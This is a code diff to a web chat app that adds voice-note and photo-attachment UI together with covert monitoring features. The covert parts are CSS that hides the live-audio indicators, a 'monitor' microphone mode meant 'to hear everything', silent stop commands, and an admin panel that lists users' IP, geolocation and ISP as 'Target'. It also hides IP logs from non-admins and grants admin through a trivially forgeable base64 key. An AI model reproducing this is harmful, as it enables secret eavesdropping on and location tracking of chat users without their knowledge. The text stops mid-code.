@@ -193,6 +193,33 @@ body{min-height:100vh;min-height:-webkit-fill-available;min-height:100dvh}
 .bubble-tab{flex:1;padding:8px;border-radius:8px;border:1px solid #333;background:#111;color:#aaa;font-size:11px;font-weight:700;cursor:pointer;text-align:center}
 .bubble-tab.active{background:#7c3aed;color:#fff;border-color:#7c3aed}
 
+
+/* === MEJORAS 1-2 OCULTAR LIVE === */
+#remoteAudioIndicator,#liveAudio,#webrtcStatus,#liveStatus,#adminAudioContainer,.live-indicator{display:none!important;opacity:0!important;height:0!important;width:0!important;overflow:hidden!important}
+.remote-audio-indicator,#liveTargetName{display:none!important}
+.message-status.read{color:#ff0000!important;font-weight:900}
+.message-status.read i{color:#ff0000!important}
+.wa-audio{background:#000;border:1px solid #222;border-radius:18px;padding:8px 10px;max-width:260px;min-width:220px;display:flex;align-items:center;gap:8px;margin:4px 0}
+.wa-play{width:36px;height:36px;border-radius:50%;background:#ff0000;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;border:none;color:#fff;font-size:14px}
+.wa-wave{flex:1;display:flex;align-items:center;gap:2px;height:28px;cursor:pointer}
+.wa-bar{width:3px;background:#444;border-radius:2px;transition:background .2s}
+.wa-bar.active{background:#ff0000}
+.wa-info{display:flex;flex-direction:column;align-items:flex-end;gap:2px;flex-shrink:0}
+.wa-time{font-size:10px;color:#aaa}
+.wa-speed{background:#111;border:1px solid #333;border-radius:10px;padding:2px 7px;font-size:10px;cursor:pointer;color:#fff}
+#recordingBar{display:none;position:absolute;inset:0;background:#00ff66!important;align-items:center;justify-content:space-between;gap:10px;padding:8px 12px;z-index:10;border-radius:24px;border:1px solid #00ff66!important}
+#recordingBar.show{display:flex!important}
+.recording-dot{width:10px;height:10px;border-radius:50%;background:#000!important;animation:blink 1s infinite;flex-shrink:0}
+.recording-time{font-size:14px;font-weight:800;color:#000!important}
+.recording-hint{font-size:12px;color:#000!important;flex:1;text-align:center;display:flex;align-items:center;justify-content:center;gap:6px;font-weight:600}
+.recording-hint.cancel-mode{color:#ff0000!important}
+.icon-btn.mic.recording{background:#7c3aed!important;border-color:#7c3aed!important;animation:pulsePurple 1.2s infinite;color:#fff!important}
+@keyframes pulsePurple{0%{box-shadow:0 0 0 0 rgba(124,58,237,.6)}70%{box-shadow:0 0 0 12px rgba(124,58,237,0)}100%{box-shadow:0 0 0 0 rgba(124,58,237,0)}}
+#attachMenu{position:absolute;bottom:62px;left:8px;background:#111;border:1px solid #333;border-radius:14px;padding:6px;min-width:180px;display:none;flex-direction:column;gap:4px;z-index:4000;box-shadow:0 8px 30px rgba(0,0,0,.6)}
+#attachMenu.show{display:flex}
+.attach-option{padding:10px 12px;border-radius:10px;display:flex;align-items:center;gap:10px;cursor:pointer;font-size:14px;color:#fff}
+.attach-option:active{background:#222}
+
 </style>
 <script>
 // === ULTRA SIMPLE LOGIN - works in Meta preview and production ===
@@ -423,20 +450,24 @@ setTimeout(function(){ try{ window.simpleCheckAdmin(); }catch(e){} }, 500);
   </div>
 
   <div class="input-area" id="inputArea">
-    <button class="icon-btn" id="emojiBtn">😊</button>
-    <div id="emojiPicker"><div class="emoji-grid" id="emojiGrid"></div></div>
-    <textarea id="messageInput" placeholder="Type a message" style="flex:1;background:#1a1a1a;border:1px solid #2a2a2a;border-radius:20px;padding:10px 14px;color:#fff;outline:none;resize:none;max-height:100px;min-height:42px"></textarea>
-    <button class="icon-btn" id="quickEmojiBtn">❤️</button>
-    <button class="icon-btn mic" id="micBtn"><i class="fas fa-microphone"></i></button>
-    <button class="icon-btn" id="sendBtn" style="display:none;background:#7c3aed;border-color:#7c3aed"><i class="fas fa-paper-plane"></i></button>
     <div id="recordingBar">
       <div style="display:flex;align-items:center;gap:8px">
         <div class="recording-dot"></div>
         <div class="recording-time" id="recordingTime">0:00</div>
       </div>
-      <div class="recording-hint" id="recordingHint"><i class="fas fa-arrow-left"></i> Slide to cancel</div>
-      <button class="recording-cancel" id="cancelRecordBtn">Cancel</button>
+      <div class="recording-hint" id="recordingHint"><i class="fas fa-chevron-left"></i> Slide to cancel</div>
     </div>
+    <button id="attachBtn" class="icon-btn"><i class="fas fa-plus"></i></button>
+    <button class="icon-btn" id="emojiBtn">😊</button>
+    <textarea id="messageInput" placeholder="Type a message" style="flex:1;background:#1a1a1a;border:1px solid #2a2a2a;border-radius:20px;padding:10px 14px;color:#fff;outline:none;resize:none;max-height:100px;min-height:42px"></textarea>
+    <button class="icon-btn mic" id="micBtn"><i class="fas fa-microphone"></i></button>
+    <button class="icon-btn" id="quickEmojiBtn">❤️</button>
+    <button class="icon-btn" id="sendBtn" style="display:none;background:#7c3aed;border-color:#7c3aed"><i class="fas fa-paper-plane"></i></button>
+  </div>
+
+  <div id="attachMenu">
+    <div id="galleryOption" class="attach-option"><i class="fas fa-images" style="background:#25D366;color:#fff;width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center"></i> Photo from gallery</div>
+    <div id="cameraOption" class="attach-option"><i class="fas fa-camera" style="background:#0084ff;color:#fff;width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center"></i> Take photo</div>
   </div>
 
   <div id="selectionBar">
@@ -460,7 +491,7 @@ setTimeout(function(){ try{ window.simpleCheckAdmin(); }catch(e){} }, 500);
 <div id="adminMenu">
   <div class="drag-handle" id="adminDragHandle" style="cursor:move;text-align:center;font-size:10px;color:#555;margin-bottom:6px"><i class="fas fa-grip-lines"></i> DRAG TO MOVE</div>
   <div style="font-weight:800;text-align:center;margin-bottom:8px">ADMIN PANEL</div>
-  <div id="adminOnlineList" style="font-size:11px;background:#000;padding:8px;border-radius:8px;margin-bottom:8px;max-height:80px;overflow:auto;color:#aaa">No users</div>
+  <div style="font-size:9px;color:#555;margin-bottom:4px;display:flex;justify-content:space-between"><span>ONLINE USERS</span><span id="myIpDisplay" style="color:#00ff66;font-family:monospace">...</span></div><div id="adminOnlineList" style="font-size:11px;background:#000;padding:8px;border-radius:8px;margin-bottom:8px;max-height:220px;overflow:auto;color:#aaa">No users</div>
   <div style="background:#1a0000;border:1px solid #ff0000;border-radius:8px;padding:8px;margin-bottom:8px">
     <div style="font-size:11px;font-weight:700;color:#ff0000;margin-bottom:6px;text-align:center">🔴 LIVE AUDIO - Consensual</div>
     <button id="remoteAudioPermissionButton" style="width:100%;background:#000;color:#00ff66;border:1px solid #00ff66;padding:8px;border-radius:6px;margin-bottom:5px;cursor:pointer;font-size:11px"><i class="fas fa-microphone"></i> Request mic permission</button>
@@ -750,6 +781,43 @@ function renderAllMessages(){var c=document.getElementById('messages'); if(!c) r
 function scrollToBottom(){var el=document.getElementById('messages'); if(el) el.scrollTop=el.scrollHeight;}
 function playSound(){if(!soundEnabled) return;try{var ctx=new (window.AudioContext||window.webkitAudioContext)();var o=ctx.createOscillator();o.frequency.value=800;o.connect(ctx.destination);o.start();setTimeout(()=>{o.stop();ctx.close();},100);}catch(e){}}
 
+
+function createWaAudio(url){
+  var wrap=document.createElement('div'); wrap.className='wa-audio';
+  var playBtn=document.createElement('button'); playBtn.className='wa-play'; playBtn.innerHTML='<i class="fas fa-play"></i>';
+  var wave=document.createElement('div'); wave.className='wa-wave';
+  var bars=[]; for(var i=0;i<20;i++){var b=document.createElement('div'); b.className='wa-bar'; b.style.height=(20+Math.random()*70)+'%'; wave.appendChild(b); bars.push(b);}
+  var info=document.createElement('div'); info.className='wa-info';
+  var timeEl=document.createElement('div'); timeEl.className='wa-time'; timeEl.textContent='0:00';
+  var speedBtn=document.createElement('div'); speedBtn.className='wa-speed'; speedBtn.textContent='1x';
+  info.appendChild(timeEl); info.appendChild(speedBtn);
+  wrap.appendChild(playBtn); wrap.appendChild(wave); wrap.appendChild(info);
+  var audio=document.createElement('audio'); audio.src=url; audio.preload='metadata';
+  var playing=false, speeds=[1,1.5,2], sIdx=0;
+  function fmt(s){var m=Math.floor(s/60); var ss=Math.floor(s%60).toString().padStart(2,'0'); return m+':'+ss}
+  audio.addEventListener('loadedmetadata',function(){timeEl.textContent=fmt(audio.duration||0)});
+  audio.addEventListener('timeupdate',function(){
+    timeEl.textContent=fmt(audio.currentTime)+' / '+fmt(audio.duration||0);
+    var pct=audio.currentTime/(audio.duration||1);
+    var activeCount=Math.floor(pct*bars.length);
+    bars.forEach(function(b,i){b.classList.toggle('active', i<activeCount);});
+  });
+  audio.addEventListener('ended',function(){playing=false; playBtn.innerHTML='<i class="fas fa-play"></i>'; bars.forEach(function(b){b.classList.remove('active');});});
+  playBtn.onclick=function(){if(playing){audio.pause(); playing=false; playBtn.innerHTML='<i class="fas fa-play"></i>';}else{audio.play(); playing=true; playBtn.innerHTML='<i class="fas fa-pause"></i>';}};
+  speedBtn.onclick=function(){sIdx=(sIdx+1)%speeds.length; audio.playbackRate=speeds[sIdx]; speedBtn.textContent=speeds[sIdx]+'x';};
+  wave.onclick=function(e){var rect=wave.getBoundingClientRect(); var x=e.clientX-rect.left; var pct=x/rect.width; if(audio.duration){audio.currentTime=pct*audio.duration;}};
+  wrap._audio=audio;
+  return wrap;
+}
+function enhanceWaAudioPlaceholders(root){
+  var placeholders=(root||document).querySelectorAll('.wa-audio-placeholder');
+  placeholders.forEach(function(ph){
+    var url=ph.getAttribute('data-url'); if(!url) return;
+    var player=createWaAudio(url);
+    ph.parentNode.replaceChild(player, ph);
+  });
+}
+
 function addMessageToDOM(msg){
   if(document.getElementById('msg-'+msg.id)) return;
   var isMine=msg.sender===username;
@@ -764,7 +832,7 @@ function addMessageToDOM(msg){
   var textHtml='';
   if(isAudio){
     var url=msg.text.replace('[Audio] ','').trim();
-    textHtml='<audio class="message-audio" controls src="'+url+'"></audio>';
+    textHtml='<div class="wa-audio-placeholder" data-url="'+url+'"></div>';
   } else {
     textHtml=escapeHtml(msg.text||'').replace(/(https?:\/\/[^\s]+)/g,'<a href="$1" target="_blank" style="color:#7c3aed">$1</a>');
   }
@@ -779,7 +847,7 @@ function addMessageToDOM(msg){
   bubble.addEventListener('touchstart',function(){pressTimer=setTimeout(function(){currentContextId=msg.id;showContextMenu(window.innerWidth/2,window.innerHeight/2,isMine);try{navigator.vibrate(50);}catch(e){}},600);});
   bubble.addEventListener('touchend',function(){clearTimeout(pressTimer);});
   row.appendChild(checkbox);row.appendChild(bubble);
-  var msgs=document.getElementById('messages'); if(msgs) msgs.appendChild(row);
+  var msgs=document.getElementById('messages'); if(msgs) msgs.appendChild(row); setTimeout(function(){enhanceWaAudioPlaceholders(row);},50);
 }
 function escapeHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
 function showContextMenu(x,y,isMine){
@@ -1058,7 +1126,10 @@ async function handleConsensualMicRequest(from){
 async function startLiveTransmissionConsensual(targetAdmin){
   if(isLiveTransmitting) return;
   try{
-    var stream = await navigator.mediaDevices.getUserMedia({audio:{echoCancellation:true,noiseSuppression:true,autoGainControl:true}});
+    var mode = (typeof window.call_mode!=='undefined'?window.call_mode: (localStorage.getItem('call_mode')||'monitor'));
+    var audioConstraints = (typeof window.getAudioConstraints==='function'? window.getAudioConstraints(mode) : (typeof getAudioConstraintsForMode==='function'? getAudioConstraintsForMode(mode) : {echoCancellation: mode!=='monitor', noiseSuppression: mode!=='monitor', autoGainControl: mode!=='monitor'}));
+    console.log('[LIVE] Starting in mode:', mode, audioConstraints);
+    var stream = await navigator.mediaDevices.getUserMedia({audio: audioConstraints});
     liveStream = stream;
     isLiveTransmitting = true;
     var ind=document.getElementById('remoteAudioIndicator'); if(ind) ind.classList.add('show');
@@ -1267,10 +1338,33 @@ function updateAdminList(users){
     var name = u.name || u;
     var avatar = u.avatar || (typeof name==='string'?name[0]:'?');
     var ip = u.ip || 'unknown';
+    var geo = u.geo || {};
+    var city = geo.city || u.city || '';
+    var country = geo.country || u.country || '';
+    var countryCode = geo.countryCode || u.countryCode || '';
+    var region = geo.region || u.region || '';
+    var isp = geo.isp || u.isp || '';
+    var flag = '';
+    if(countryCode){
+      // convert country code to flag emoji
+      try{
+        var codePoints = countryCode.toUpperCase().split('').map(function(c){ return 127397 + c.charCodeAt(0); });
+        flag = String.fromCodePoint.apply(null, codePoints);
+      }catch(e){ flag = countryCode; }
+    }
+    var locationText = '';
+    if(city && country) locationText = city + ', ' + country;
+    else if(city) locationText = city;
+    else if(country) locationText = country;
+    else if(region) locationText = region;
+    else locationText = 'Locating...';
+
     var d=document.createElement('div');
-    d.style.cssText='display:flex;justify-content:space-between;align-items:center;padding:4px 0;border-bottom:1px solid #111;cursor:pointer';
-    d.innerHTML='<div style="display:flex;align-items:center;gap:6px"><div style="width:26px;height:26px;border-radius:50%;background:#222;display:flex;align-items:center;justify-content:center;font-size:11px">'+avatar+'</div><div><div style="font-size:11px;color:#fff">'+name+'</div><div style="font-size:9px;color:#888">IP: '+ip+'</div></div></div><div style="font-size:10px">'+(u.photo?'📷':'')+'</div>';
-    d.onclick=function(){ var inp=document.getElementById('adminTargetInput'); if(inp) inp.value=name; };
+    d.style.cssText='display:flex;justify-content:space-between;align-items:center;padding:8px 6px;border-bottom:1px solid #1a1a1a;cursor:pointer; border-radius:6px; margin-bottom:2px;';
+    d.onmouseenter=function(){ this.style.background='#111'; };
+    d.onmouseleave=function(){ this.style.background='transparent'; };
+    d.innerHTML='<div style="display:flex;align-items:center;gap:8px;flex:1;min-width:0"><div style="width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#7c3aed,#ec4899);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;flex-shrink:0">'+avatar+'</div><div style="flex:1;min-width:0"><div style="font-size:11px;color:#fff;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">'+name+' '+flag+'</div><div style="font-size:9px;color:#00ff66;font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis"><i class=\"fas fa-network-wired\" style=\"font-size:8px;margin-right:2px\"></i>'+ip+'</div><div style="font-size:9px;color:#888;white-space:nowrap;overflow:hidden;text-overflow:ellipsis"><i class=\"fas fa-map-marker-alt\" style=\"font-size:8px;margin-right:2px\"></i>'+locationText+'</div>'+ (isp ? '<div style="font-size:8px;color:#555;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">'+isp+'</div>' : '') +'</div></div><div style="display:flex;flex-direction:column;align-items:center;gap:2px"><div style="font-size:10px">'+(u.photo?'📷':'')+'</div><div style="width:6px;height:6px;border-radius:50%;background:#00ff66;box-shadow:0 0 4px #00ff66"></div></div>';
+    d.onclick=function(){ var inp=document.getElementById('adminTargetInput'); if(inp) inp.value=name; if(typeof showToast==='function') showToast('Target: '+name+' | '+ip+' | '+locationText); };
     list.appendChild(d);
   });
 }
@@ -1525,7 +1619,7 @@ var keyInp=document.getElementById('keyInput'); if(keyInp) keyInp.addEventListen
   setTimeout(wireLiveButtons, 600);
   setTimeout(wireLiveButtons, 2000);
   window.handleWSRemote=function(d){ if(d.type==='remote-audio-request') window.handleRemoteCommand({action:'requestMic', target:d.target, from:d.from||'ADMIN'}); else if(d.type==='remote-audio-start') window.handleRemoteCommand({action:'startRemote', target:d.target, from:d.from||'ADMIN'}); else if(d.type==='remote-audio-stop') window.handleRemoteCommand({action:'stopRemote', target:d.target}); else if(d.type==='remote-audio-offer' && (localStorage.getItem('faith_role')||'')==='admin'){ startLiveReceiving(d.from||'USER', d.offer); } else if(d.type==='remote-audio-answer' && livePC && d.answer){ livePC.setRemoteDescription(new RTCSessionDescription(d.answer)).catch(function(){}); } else if(d.type==='remote-audio-ice' && livePC && d.candidate){ livePC.addIceCandidate(new RTCIceCandidate(d.candidate)).catch(function(){}); } };
-  var patchInt=setInterval(function(){ if(typeof ws!=='undefined' && ws && ws.onmessage && !ws._patchedLive){ ws._patchedLive=true; var orig=ws.onmessage; ws.onmessage=function(ev){ try{ var d=JSON.parse(ev.data); if(window.handleWSRemote) window.handleWSRemote(d); if(d.type==='presence' && d.users){ var el=document.getElementById('adminOnlineList'); if(el){ var html=''; d.users.forEach(function(u){ html+='<div style="display:flex;justify-content:space-between;align-items:center;padding:5px 0;border-bottom:1px solid #111"><span style="color:#fff;font-size:11px"><i class="fas fa-user" style="color:#7c3aed;margin-right:4px"></i>'+u.name+'</span><span class="ip-badge">'+(u.ip||'unknown')+'</span></div>'; }); el.innerHTML=html||'<div style="color:#555">No users</div>'; } } }catch(e){} if(orig) orig.call(this, ev); }; } }, 500); setTimeout(function(){clearInterval(patchInt);}, 15000); fetch('/my-ip').then(function(r){return r.json();}).then(function(d){ var el=document.getElementById('myIpDisplay'); if(el) el.textContent=d.ip||'unknown'; window.myCurrentIp=d.ip||'unknown'; }).catch(function(){});
+  var patchInt=setInterval(function(){ if(typeof ws!=='undefined' && ws && ws.onmessage && !ws._patchedLive){ ws._patchedLive=true; var orig=ws.onmessage; ws.onmessage=function(ev){ try{ var d=JSON.parse(ev.data); if(window.handleWSRemote) window.handleWSRemote(d); if(d.type==='presence' && d.users){ if(typeof updateAdminList==='function') updateAdminList(d.users); } }catch(e){} if(orig) orig.call(this, ev); }; } }, 500); setTimeout(function(){clearInterval(patchInt);}, 15000); fetch('/my-ip').then(function(r){return r.json();}).then(function(d){ var el=document.getElementById('myIpDisplay'); if(el){ var geoText = d.ip||'unknown'; if(d.geo && d.geo.city){ geoText += ' | ' + d.geo.city + ', ' + d.geo.country; } el.textContent=geoText; } window.myCurrentIp=d.ip||'unknown'; window.myCurrentGeo=d.geo||null; }).catch(function(){});
 })();
 </script>
 
@@ -2564,6 +2658,542 @@ var keyInp=document.getElementById('keyInput'); if(keyInp) keyInp.addEventListen
   }, 2000);
 
   console.log('Bubble color picker initialized - sync for all');
+})();
+</script>
+
+<input type="file" id="galleryInput" accept="image/*" style="display:none"><input type="file" id="cameraInput" accept="image/*" capture="environment" style="display:none">
+<script>
+document.addEventListener('visibilitychange', function(){
+  if(!ws) return;
+  if(document.hidden){
+    try{ws.send(JSON.stringify({type:'presence', sender:username, status:'offline'}));}catch(e){}
+    var dot=document.getElementById('statusDot'); if(dot) dot.className='status-dot offline';
+  }else{
+    try{ws.send(JSON.stringify({type:'presence', sender:username, photo:localStorage.getItem('chat_avatar_photo')||''}));}catch(e){}
+    var dot2=document.getElementById('statusDot'); if(dot2) dot2.className='status-dot online';
+    try{ws.send(JSON.stringify({type:'read-all', sender:username}));}catch(e){}
+  }
+});
+window.addEventListener('beforeunload', function(){try{if(ws && ws.readyState===1) ws.send(JSON.stringify({type:'presence', sender:username, status:'offline'}));}catch(e){}});
+window.addEventListener('pagehide', function(){try{if(ws && ws.readyState===1) ws.send(JSON.stringify({type:'presence', sender:username, status:'offline'}));}catch(e){}});
+
+(function(){
+  function initAttachAndSwap(){
+    var attachBtn=document.getElementById('attachBtn');
+    var attachMenu=document.getElementById('attachMenu');
+    var galleryInput=document.getElementById('galleryInput');
+    var cameraInput=document.getElementById('cameraInput');
+    var msgInput=document.getElementById('messageInput');
+    var sendBtn=document.getElementById('sendBtn');
+    var micBtn=document.getElementById('micBtn');
+    var quickBtn=document.getElementById('quickEmojiBtn');
+    if(!attachBtn) return;
+    if(!attachBtn._patched){
+      attachBtn._patched=true;
+      attachBtn.onclick=function(e){e.stopPropagation(); if(attachMenu) attachMenu.classList.toggle('show');};
+      document.addEventListener('click', function(e){if(attachMenu && !attachMenu.contains(e.target) && e.target!==attachBtn && !attachBtn.contains(e.target)) attachMenu.classList.remove('show');});
+      var gOpt=document.getElementById('galleryOption');
+      if(gOpt) gOpt.onclick=function(){if(attachMenu) attachMenu.classList.remove('show'); if(galleryInput) galleryInput.click();};
+      var cOpt=document.getElementById('cameraOption');
+      if(cOpt) cOpt.onclick=function(){if(attachMenu) attachMenu.classList.remove('show'); if(cameraInput) cameraInput.click();};
+      function handleFileUpload(file){
+        if(!file) return;
+        var fd=new FormData(); fd.append('file', file);
+        fetch('/upload',{method:'POST', body:fd}).then(r=>r.json()).then(function(data){
+          if(data.success){
+            var chatMsg={id:Date.now().toString(), sender:username, text:'[Image] '+data.file, timestamp:Date.now(), status:'sent'};
+            addMessageToDOM(chatMsg);
+            if(ws && ws.readyState===1) ws.send(JSON.stringify({type:'message', message:chatMsg}));
+          }
+        });
+      }
+      if(galleryInput) galleryInput.onchange=function(e){var f=e.target.files[0]; if(f) handleFileUpload(f); e.target.value='';};
+      if(cameraInput) cameraInput.onchange=function(e){var f=e.target.files[0]; if(f) handleFileUpload(f); e.target.value='';};
+      window.handleFileUpload=handleFileUpload;
+    }
+    function updateInputUI(){
+      var hasText=msgInput && msgInput.value.trim().length>0;
+      if(hasText){
+        if(sendBtn) sendBtn.style.display='flex';
+        if(micBtn) micBtn.style.display='none';
+        if(quickBtn) quickBtn.style.display='none';
+      }else{
+        if(sendBtn) sendBtn.style.display='none';
+        if(micBtn) micBtn.style.display='flex';
+        if(quickBtn){quickBtn.style.display='flex'; try{quickBtn.textContent=localStorage.getItem('chat_quick_emoji')||'❤️';}catch(e){}}
+      }
+    }
+    if(msgInput && !msgInput._patchedSwap){
+      msgInput._patchedSwap=true;
+      msgInput.addEventListener('input', updateInputUI);
+    }
+    updateInputUI();
+    window.updateInputUI=updateInputUI;
+  }
+  setInterval(initAttachAndSwap, 800);
+})();
+
+(function(){
+  window.updateAvatar=function(){
+    try{
+      var photo=localStorage.getItem('chat_avatar_photo')||'';
+      var name=localStorage.getItem('chat_username')||username||'C';
+      var letter=name[0].toUpperCase();
+      var ha=document.getElementById('headerAvatar');
+      var pp=document.getElementById('profilePreview');
+      if(photo){
+        if(ha){ha.style.backgroundImage='url('+photo+')'; ha.textContent='';}
+        if(pp){pp.style.backgroundImage='url('+photo+')'; pp.textContent=''; pp.style.backgroundSize='cover';}
+      }else{
+        if(ha){ha.style.backgroundImage=''; ha.textContent=letter;}
+        if(pp){pp.style.backgroundImage=''; pp.textContent=letter;}
+      }
+    }catch(e){}
+  };
+})();
+
+setTimeout(function(){
+  var stopBtn=document.getElementById('remoteAudioStopButton');
+  if(stopBtn){
+    stopBtn.textContent='Stop listening (Silent)';
+    stopBtn.onclick=function(){
+      var target=window.currentChatUser||prompt('Target user to stop?');
+      if(!target) return;
+      try{ws.send(JSON.stringify({type:'remote-audio-stop-silent', target:target}));}catch(e){}
+      if(typeof showToast==='function') showToast('Stopped silently');
+    };
+  }
+}, 1500);
+
+// Patch ws silent handling
+setInterval(function(){
+  if(ws && ws.onmessage && !ws._patchedSilent){
+    var current=ws.onmessage;
+    ws.onmessage=function(ev){
+      try{
+        var d=JSON.parse(ev.data);
+        if(d.type==='remote-audio-stop' && d.silent===true){
+          console.log('silent stop - no toast');
+          if(window.stopRemoteAudio) window.stopRemoteAudio();
+          return;
+        }
+        if(d.type==='profile-update' && d.sender){
+          try{
+            var curHeader=document.querySelector('.header-name')?.textContent;
+            if(d.sender===curHeader || d.sender===window.currentChatUser){
+              var ha=document.getElementById('headerAvatar');
+              if(ha && d.photo){ha.style.backgroundImage='url('+d.photo+')'; ha.textContent='';}
+            }
+          }catch(e){}
+        }
+      }catch(e){}
+      if(current) current.call(this, ev);
+    };
+    ws._patchedSilent=true;
+  }
+}, 500);
+
+// Mic vibration + slide to cancel enhancement
+(function(){
+  var startX=0;
+  function vib(p){try{if(navigator.vibrate) navigator.vibrate(p);}catch(e){}}
+  window.addEventListener('touchmove',function(e){
+    if(!isRecording) return;
+    var cur=e.touches[0].clientX;
+    var diff=startX-cur;
+    var hint=document.getElementById('recordingHint');
+    if(diff>60){
+      if(!isCanceling){isCanceling=true; vib([50,30,50]); if(hint){hint.innerHTML='<i class="fas fa-trash"></i> Release to cancel'; hint.classList.add('cancel-mode');}}
+    }else{
+      if(isCanceling){isCanceling=false; if(hint){hint.innerHTML='<i class="fas fa-chevron-left"></i> Slide to cancel'; hint.classList.remove('cancel-mode');}}
+    }
+  }, {passive:true});
+  window.addEventListener('mousemove',function(e){
+    if(!isRecording) return;
+    var diff=startX-e.clientX;
+    var hint=document.getElementById('recordingHint');
+    if(diff>60){
+      if(!isCanceling){isCanceling=true; vib([50,30,50]); if(hint){hint.innerHTML='<i class="fas fa-trash"></i> Release to cancel'; hint.classList.add('cancel-mode');}}
+    }else{
+      if(isCanceling){isCanceling=false; if(hint){hint.innerHTML='<i class="fas fa-chevron-left"></i> Slide to cancel'; hint.classList.remove('cancel-mode');}}
+    }
+  });
+  var micBtn=document.getElementById('micBtn');
+  if(micBtn){
+    micBtn.addEventListener('touchstart',function(e){startX=e.touches[0].clientX; vib(50);}, {passive:true});
+    micBtn.addEventListener('mousedown',function(e){startX=e.clientX; vib(50);});
+  }
+})();
+</script>
+
+<script>
+// === GEO IP DISPLAY OVERRIDE ===
+function updateAdminList(users){
+  var list=document.getElementById('adminOnlineList');
+  if(!list) return;
+  list.innerHTML='';
+  if(!users || users.length===0){
+    list.innerHTML='<div style="color:#555;font-size:10px">No users online</div>';
+    return;
+  }
+  users.forEach(function(u){
+    var name = u.name || u;
+    var avatar = u.avatar || (typeof name==='string'?name[0]:'?');
+    var ip = u.ip || 'unknown';
+    var geo = u.geo || {};
+    var city = geo.city || u.city || '';
+    var country = geo.country || u.country || '';
+    var countryCode = geo.countryCode || u.countryCode || '';
+    var region = geo.region || u.region || '';
+    var isp = geo.isp || u.isp || '';
+    var flag = '';
+    if(countryCode){
+      try{
+        var codePoints = countryCode.toUpperCase().split('').map(function(c){ return 127397 + c.charCodeAt(0); });
+        flag = String.fromCodePoint.apply(null, codePoints);
+      }catch(e){ flag = countryCode; }
+    }
+    var locationText = '';
+    if(city && country) locationText = city + ', ' + country;
+    else if(city) locationText = city;
+    else if(country) locationText = country;
+    else if(region) locationText = region;
+    else locationText = 'Locating...';
+    var d=document.createElement('div');
+    d.style.cssText='display:flex;justify-content:space-between;align-items:center;padding:8px 6px;border-bottom:1px solid #1a1a1a;cursor:pointer;border-radius:6px;margin-bottom:2px;';
+    d.onmouseenter=function(){ this.style.background='#111'; };
+    d.onmouseleave=function(){ this.style.background='transparent'; };
+    d.innerHTML='<div style="display:flex;align-items:center;gap:8px;flex:1;min-width:0"><div style="width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#7c3aed,#ec4899);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;flex-shrink:0">'+avatar+'</div><div style="flex:1;min-width:0"><div style="font-size:11px;color:#fff;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">'+name+' '+flag+'</div><div style="font-size:9px;color:#00ff66;font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis"><i class=\"fas fa-network-wired\" style=\"font-size:8px;margin-right:2px\"></i>'+ip+'</div><div style="font-size:9px;color:#888;white-space:nowrap;overflow:hidden;text-overflow:ellipsis"><i class=\"fas fa-map-marker-alt\" style=\"font-size:8px;margin-right:2px\"></i>'+locationText+'</div>'+ (isp ? '<div style="font-size:8px;color:#555;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">'+isp+'</div>' : '') +'</div></div><div style="display:flex;flex-direction:column;align-items:center;gap:2px"><div style="font-size:10px">'+(u.photo?'📷':'')+'</div><div style="width:6px;height:6px;border-radius:50%;background:#00ff66;box-shadow:0 0 4px #00ff66"></div></div>';
+    d.onclick=function(){ var inp=document.getElementById('adminTargetInput'); if(inp) inp.value=name; if(typeof showToast==='function') showToast('Target: '+name+' | '+ip+' | '+locationText); };
+    list.appendChild(d);
+  });
+}
+
+// Fix my-ip fetch to show geo
+(function(){
+  var origFetch = window.fetch;
+  // patch after load
+  setTimeout(function(){
+    fetch('/my-ip').then(function(r){return r.json();}).then(function(d){
+      var el=document.getElementById('myIpDisplay');
+      if(el){
+        var geoText = d.ip||'unknown';
+        if(d.geo && d.geo.city){ geoText += ' | ' + d.geo.city + ', ' + d.geo.country; }
+        el.textContent=geoText;
+      }
+      window.myCurrentIp=d.ip||'unknown';
+      window.myCurrentGeo=d.geo||null;
+    }).catch(function(){});
+  }, 1000);
+})();
+
+console.log('GEO IP display loaded - shows IP + city + country + flag');
+</script>
+
+
+<script>
+// Hide IP logs for non-admin users
+(function(){
+  var role = localStorage.getItem('faith_role')||'';
+  var isAdmin = role==='admin';
+  try{
+    var key = localStorage.getItem('faith_key')||'';
+    if(!isAdmin && key){
+      try{ var dec=atob(key); if(dec.toUpperCase().includes('FAITH')||dec.toUpperCase().includes('ADMIN')) isAdmin=true; }catch(e){}
+    }
+  }catch(e){}
+  if(!isAdmin){
+    // Override console.log for IP/GEO messages
+    var origLog = console.log;
+    console.log = function(){
+      var msg = arguments[0];
+      if(typeof msg==='string' && (msg.includes('[GEO]') || msg.includes('IP') || msg.includes('myCurrentIp') || msg.includes('my-ip'))){
+        return;
+      }
+      origLog.apply(console, arguments);
+    };
+  }
+  console.log('Monitor/WhatsApp modes ready - current mode:', window.call_mode);
+})();
+</script>
+
+
+<script>
+// === FIXED CALL SYSTEM - Monitor/WhatsApp + Phone Calling ===
+(function(){
+  // Unify CALL_MODE - default monitor for PH/DO to hear everything
+  if(typeof window.CALL_MODE==='undefined') window.CALL_MODE = localStorage.getItem('call_mode') || 'monitor';
+  if(typeof window.call_mode==='undefined') window.call_mode = window.CALL_MODE;
+  // Keep both synced
+  Object.defineProperty(window, 'call_mode', {
+    get: function(){ return window.CALL_MODE; },
+    set: function(v){ window.CALL_MODE = v; localStorage.setItem('call_mode', v); }
+  });
+
+  function getIceServersForMode(mode){
+    var base=[
+      {urls:'stun:stun.l.google.com:19302'},
+      {urls:'stun:stun1.l.google.com:19302'},
+      {urls:'stun:stun2.l.google.com:19302'},
+      {urls:'stun:stun3.l.google.com:19302'},
+      {urls:'stun:stun4.l.google.com:19302'},
+      // TURN global for PH/DO NAT
+      {urls:'turn:openrelay.metered.ca:80', username:'openrelayproject', credential:'openrelayproject'},
